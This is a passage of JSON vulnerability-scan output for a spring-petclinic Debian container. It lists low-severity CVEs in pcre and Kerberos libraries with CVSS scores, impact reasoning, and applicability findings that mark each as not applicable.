                  "Description": "It is highly unlikely that an attacker can remotely control a regular expression pattern",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://github.com/advisories/GHSA-689f-qv4w-xgqf",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre3:2:8.39-13",
            "cve_id": "CVE-2019-20838",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable JIT functionality is never used",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre3:2:8.39-13",
            "vulnerability_id": "CVE-2019-20838",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-60750",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable \"dbentry->n_key_data\" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a \"u4\" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libk5crypto3",
         "source_id": "deb://debian:bullseye:libk5crypto3",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2018-5709",
                     "cwe": [
                        "CWE-190"
                     ],
                     "cwe_details": {
                        "CWE-190": {
                           "name": "Integer Overflow or Wraparound",
                           "description": "The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "14"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:P/A:N",
                     "cvss_v3": "7.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
                  }
               ],
               "description": "An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable \"dbentry->n_key_data\" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a \"u4\" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-60750",
            "VulnerabilityTitle": "",
            "ShortDescription": "(Non-issue) Integer truncation in Kerberos5 leads to no impact when processing a crafted Kerberos5 beta7 format database file.",
            "FullDescription": "[Kerberos](https://web.mit.edu/kerberos/) is a network authentication protocol. It is designed to provide strong authentication for client/server applications by using secret-key cryptography. A free implementation of this protocol is available from the Massachusetts Institute of Technology. Kerberos is available in many commercial products as well.\n\nA [Kerberos database](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/database.html) contains all of a realm’s Kerberos principals, their passwords, and other administrative information about each principal. For the most part, you will use the `kdb5_util` program to manipulate the Kerberos database as a whole, and the `kadmin` program to make changes to the entries in the database. \n\nIn `kdb5_util`, there is a `process_k5beta7_princ` method responsible for adding Kerberos 5 beta 7 format data from a file to the Kerberos database. This function is vulnerable to integer overflow as a Database entry defined on 16-bits is assigned a 32-bits value from the given file. It turns out that it does not have any impact at all and it is not a security flaw.\n\nOriginally, the vulnerability was mistakenly reported as an Integer Overflow.\nThe issue should not affect any other data allocated close to the 16-bit integer in question. Furthermore, a negative value of the 16-bit integer does not impact the flow of the program in any meaningful way.\n\nTo trigger the integer truncation, an attacker has to get the user to use the `kdb5_util` utility to restore a Kerberos 5 - beta 7 format - database from a crafted malicious file. It can be done using the following command:\n```\nkdb5_util load -d DB_NAME DB_FILE \n```",
            "Impact": 4,
            "VulnerabilityType": "Unspecified",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "Requires the user to restore the Kerberos Database from a crafted malicious file, which is unlikely.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "The integer truncation doesn't affect data allocated near the 16-bit integer and doesn't have any meaningful impact.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the fact that the vulnerability does not have any security impact.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "A Kerberos database is not restored often. The attacker must find a way to get the user to restore the database from a crafted file. If the attacker has access to the backup file, it can be modified even without exploiting this vulnerability. The vulnerability only helps by making the attacker's modifications to the backup file seem legitimate when manually inspected.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://github.com/poojamnit/Kerberos-V5-1.16-Vulnerabilities/blob/master/Integer%20Overflow%20Description",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/krb5/krb5/commit/d15930bec22781473c2eaf72c08a145508b373ba",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2018-5709",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The CVE is never applicable since the integer truncation leads to no security impact",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2018-5709",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-60750",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable \"dbentry->n_key_data\" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a \"u4\" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5-3",
         "source_id": "deb://debian:bullseye:libkrb5-3",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2018-5709",
                     "cwe": [
                        "CWE-190"
                     ],
                     "cwe_details": {
                        "CWE-190": {
                           "name": "Integer Overflow or Wraparound",
                           "description": "The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "14"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:P/A:N",
                     "cvss_v3": "7.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
                  }
               ],
               "description": "An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable \"dbentry->n_key_data\" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a \"u4\" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-60750",
            "VulnerabilityTitle": "",
            "ShortDescription": "(Non-issue) Integer truncation in Kerberos5 leads to no impact when processing a crafted Kerberos5 beta7 format database file.",
            "FullDescription": "[Kerberos](https://web.mit.edu/kerberos/) is a network authentication protocol. It is designed to provide strong authentication for client/server applications by using secret-key cryptography. A free implementation of this protocol is available from the Massachusetts Institute of Technology. Kerberos is available in many commercial products as well.\n\nA [Kerberos database](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/database.html) contains all of a realm’s Kerberos principals, their passwords, and other administrative information about each principal. For the most part, you will use the `kdb5_util` program to manipulate the Kerberos database as a whole, and the `kadmin` program to make changes to the entries in the database. \n\nIn `kdb5_util`, there is a `process_k5beta7_princ` method responsible for adding Kerberos 5 beta 7 format data from a file to the Kerberos database. This function is vulnerable to integer overflow as a Database entry defined on 16-bits is assigned a 32-bits value from the given file. It turns out that it does not have any impact at all and it is not a security flaw.\n\nOriginally, the vulnerability was mistakenly reported as an Integer Overflow.\nThe issue should not affect any other data allocated close to the 16-bit integer in question. Furthermore, a negative value of the 16-bit integer does not impact the flow of the program in any meaningful way.\n\nTo trigger the integer truncation, an attacker has to get the user to use the `kdb5_util` utility to restore a Kerberos 5 - beta 7 format - database from a crafted malicious file. It can be done using the following command:\n```\nkdb5_util load -d DB_NAME DB_FILE \n```",
            "Impact": 4,
            "VulnerabilityType": "Unspecified",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "Requires the user to restore the Kerberos Database from a crafted malicious file, which is unlikely.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "The integer truncation doesn't affect data allocated near the 16-bit integer and doesn't have any meaningful impact.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the fact that the vulnerability does not have any security impact.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "A Kerberos database is not restored often. The attacker must find a way to get the user to restore the database from a crafted file. If the attacker has access to the backup file, it can be modified even without exploiting this vulnerability. The vulnerability only helps by making the attacker's modifications to the backup file seem legitimate when manually inspected.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://github.com/poojamnit/Kerberos-V5-1.16-Vulnerabilities/blob/master/Integer%20Overflow%20Description",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/krb5/krb5/commit/d15930bec22781473c2eaf72c08a145508b373ba",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2018-5709",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The CVE is never applicable since the integer truncation leads to no security impact",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2018-5709",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-60750",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable \"dbentry->n_key_data\" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a \"u4\" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5support0",
         "source_id": "deb://debian:bullseye:libkrb5support0",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2018-5709",
                     "cwe": [
                        "CWE-190"
                     ],
                     "cwe_details": {
                        "CWE-190": {
                           "name": "Integer Overflow or Wraparound",
                           "description": "The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "14"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:P/A:N",
                     "cvss_v3": "7.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
                  }
               ],
               "description": "An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable \"dbentry->n_key_data\" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a \"u4\" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-60750",
            "VulnerabilityTitle": "",
            "ShortDescription": "(Non-issue) Integer truncation in Kerberos5 leads to no impact when processing a crafted Kerberos5 beta7 format database file.",
            "FullDescription": "[Kerberos](https://web.mit.edu/kerberos/) is a network authentication protocol. It is designed to provide strong authentication for client/server applications by using secret-key cryptography. A free implementation of this protocol is available from the Massachusetts Institute of Technology. Kerberos is available in many commercial products as well.\n\nA [Kerberos database](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/database.html) contains all of a realm’s Kerberos principals, their passwords, and other administrative information about each principal. For the most part, you will use the `kdb5_util` program to manipulate the Kerberos database as a whole, and the `kadmin` program to make changes to the entries in the database. \n\nIn `kdb5_util`, there is a `process_k5beta7_princ` method responsible for adding Kerberos 5 beta 7 format data from a file to the Kerberos database. This function is vulnerable to integer overflow as a Database entry defined on 16-bits is assigned a 32-bits value from the given file. It turns out that it does not have any impact at all and it is not a security flaw.\n\nOriginally, the vulnerability was mistakenly reported as an Integer Overflow.\nThe issue should not affect any other data allocated close to the 16-bit integer in question. Furthermore, a negative value of the 16-bit integer does not impact the flow of the program in any meaningful way.\n\nTo trigger the integer truncation, an attacker has to get the user to use the `kdb5_util` utility to restore a Kerberos 5 - beta 7 format - database from a crafted malicious file. It can be done using the following command:\n```\nkdb5_util load -d DB_NAME DB_FILE \n```",
            "Impact": 4,
            "VulnerabilityType": "Unspecified",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "Requires the user to restore the Kerberos Database from a crafted malicious file, which is unlikely.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "The integer truncation doesn't affect data allocated near the 16-bit integer and doesn't have any meaningful impact.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the fact that the vulnerability does not have any security impact.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "A Kerberos database is not restored often. The attacker must find a way to get the user to restore the database from a crafted file. If the attacker has access to the backup file, it can be modified even without exploiting this vulnerability. The vulnerability only helps by making the attacker's modifications to the backup file seem legitimate when manually inspected.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://github.com/poojamnit/Kerberos-V5-1.16-Vulnerabilities/blob/master/Integer%20Overflow%20Description",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/krb5/krb5/commit/d15930bec22781473c2eaf72c08a145508b373ba",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2018-5709",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The CVE is never applicable since the integer truncation leads to no security impact",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2018-5709",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-60750",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable \"dbentry->n_key_data\" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a \"u4\" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgssapi-krb5-2",
         "source_id": "deb://debian:bullseye:libgssapi-krb5-2",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2018-5709",
                     "cwe": [
                        "CWE-190"
                     ],
                     "cwe_details": {
                        "CWE-190": {
                           "name": "Integer Overflow or Wraparound",
                           "description": "The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "14"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:P/A:N",
                     "cvss_v3": "7.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
                  }
               ],
               "description": "An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable \"dbentry->n_key_data\" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a \"u4\" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-60750",
            "VulnerabilityTitle": "",
            "ShortDescription": "(Non-issue) Integer truncation in Kerberos5 leads to no impact when processing a crafted Kerberos5 beta7 format database file.",
            "FullDescription": "[Kerberos](https://web.mit.edu/kerberos/) is a network authentication protocol. It is designed to provide strong authentication for client/server applications by using secret-key cryptography. A free implementation of this protocol is available from the Massachusetts Institute of Technology. Kerberos is available in many commercial products as well.\n\nA [Kerberos database](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/database.html) contains all of a realm’s Kerberos principals, their passwords, and other administrative information about each principal. For the most part, you will use the `kdb5_util` program to manipulate the Kerberos database as a whole, and the `kadmin` program to make changes to the entries in the database. \n\nIn `kdb5_util`, there is a `process_k5beta7_princ` method responsible for adding Kerberos 5 beta 7 format data from a file to the Kerberos database. This function is vulnerable to integer overflow as a Database entry defined on 16-bits is assigned a 32-bits value from the given file. It turns out that it does not have any impact at all and it is not a security flaw.\n\nOriginally, the vulnerability was mistakenly reported as an Integer Overflow.\nThe issue should not affect any other data allocated close to the 16-bit integer in question. Furthermore, a negative value of the 16-bit integer does not impact the flow of the program in any meaningful way.\n\nTo trigger the integer truncation, an attacker has to get the user to use the `kdb5_util` utility to restore a Kerberos 5 - beta 7 format - database from a crafted malicious file. It can be done using the following command:\n```\nkdb5_util load -d DB_NAME DB_FILE \n```",
            "Impact": 4,
            "VulnerabilityType": "Unspecified",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "Requires the user to restore the Kerberos Database from a crafted malicious file, which is unlikely.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "The integer truncation doesn't affect data allocated near the 16-bit integer and doesn't have any meaningful impact.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the fact that the vulnerability does not have any security impact.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "A Kerberos database is not restored often. The attacker must find a way to get the user to restore the database from a crafted file. If the attacker has access to the backup file, it can be modified even without exploiting this vulnerability. The vulnerability only helps by making the attacker's modifications to the backup file seem legitimate when manually inspected.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://github.com/poojamnit/Kerberos-V5-1.16-Vulnerabilities/blob/master/Integer%20Overflow%20Description",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/krb5/krb5/commit/d15930bec22781473c2eaf72c08a145508b373ba",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2018-5709",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The CVE is never applicable since the integer truncation leads to no security impact",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2018-5709",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-526154",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Integer overflow vulnerability in pcre2test before 10.41 allows attackers to cause a denial of service or other unspecified impacts via negative input.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpcre2-8-0",
         "source_id": "deb://debian:bullseye:libpcre2-8-0",
         "source_comp_id": "deb://debian:bullseye:libpcre2-8-0:10.36-2",
         "component_versions": {
            "id": "debian:bullseye:pcre2",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-41409",
                     "cwe": [
                        "CWE-190"
                     ],
                     "cwe_details": {
                        "CWE-190": {
                           "name": "Integer Overflow or Wraparound",
                           "description": "The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "14"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Integer overflow vulnerability in pcre2test before 10.41 allows attackers to cause a denial of service or other unspecified impacts via negative input.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-526154",
            "VulnerabilityTitle": "",
            "ShortDescription": "An infinite loop in pcre2 leads to a denial of service when running pcre2test with attacker-controlled regular expressions.",
            "FullDescription": "",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The `pcre2test` CLI tool is primarily intended for developers and individuals who are familiar with regular expressions and want a convenient way to test and debug them.\nIt is extremely unlikely that a regular expression pattern will be supplied from external input in a production environment.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The GitHub Issue contains a PoC pattern that causes an infinite loop -\n`./bin/pcre2test poc.zip`",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Proof of Concept in First Comment",
                  "Url": "https://github.com/PCRE2Project/pcre2/issues/141",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official Fix Commit",
                  "Url": "https://github.com/PCRE2Project/pcre2/commit/94e1c001761373b7d9450768aa15d04c25547a35",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "GitHub Issue",
                  "Url": "https://github.com/PCRE2Project/pcre2/issues/141",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre2-8-0:10.36-2",
            "cve_id": "CVE-2022-41409",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable pcre2test binary was not found",
            "details": null
         },
         "applicability_detail": {
